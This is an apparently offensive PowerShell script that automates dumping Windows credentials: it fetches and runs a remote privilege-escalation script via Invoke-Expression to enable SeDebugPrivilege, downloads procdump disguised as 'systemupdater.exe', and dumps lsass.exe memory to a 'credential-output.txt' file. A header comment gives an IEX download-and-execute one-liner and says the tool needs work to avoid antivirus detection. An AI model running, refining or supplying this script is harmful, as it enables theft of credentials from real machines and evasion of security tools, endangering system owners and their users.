#IEX (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/paulkwalton/thescriptvault/refs/heads/main/privesc/windows/stager-procdump.ps1")
#This will automate the procdump process, but will likely trigger AV so needs some work. Kali should be configured to host a python web server.

function Check-SeDebugPrivilege {
    Write-Output "Checking SeDebugPrivilege..."
    $user = [System.Security.Principal.WindowsPrincipal]::new([System.Security.Principal.WindowsIdentity]::GetCurrent())
    $privilegeEnabled = $user.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)
    return $privilegeEnabled
}


if (-not (Check-SeDebugPrivilege)) {
    Write-Output "SeDebugPrivilege not enabled; attempting to enable..."


    $scriptUrl = "https://raw.githubusercontent.com/paulkwalton/thescriptvault/refs/heads/main/privesc/windows/adjust-token-privs.ps1"
    try {
        $scriptContent = (Invoke-WebRequest -Uri $scriptUrl -UseBasicParsing).Content
        Write-Output "Downloaded adjust-token-privs.ps1 script content"
        Invoke-Expression $scriptContent
        Adjust-TokenPrivilege -Privilege SeDebugPrivilege
        Write-Output "SeDebugPrivilege enabled."
    } catch {
        Write-Output "Failed to download or execute adjust-token-privs.ps1 script: $_"
    }
} else {
    Write-Output "SeDebugPrivilege is already enabled."
}


try {
    $procdumpUrl = "https://github.com/paulkwalton/thescriptvault/raw/refs/heads/main/privesc/windows/procdump64.exe"
    $desktopPath = [System.IO.Path]::Combine([System.Environment]::GetFolderPath("Desktop"), "systemupdater.exe")
    Invoke-WebRequest -Uri $procdumpUrl -OutFile $desktopPath -UseBasicParsing
    Write-Output "systemupdater.exe downloaded to: $desktopPath"
} catch {
    Write-Output "Failed to download systemupdater.exe: $_"
}

try {
    & $desktopPath -accepteula -ma lsass.exe ([System.IO.Path]::Combine([System.Environment]::GetFolderPath("Desktop"), "credential-output.txt"))
    Write-Output "system updater outputting requested files."
} catch {
    Write-Output "Failed to execute systemupdater.exe: $_"
}
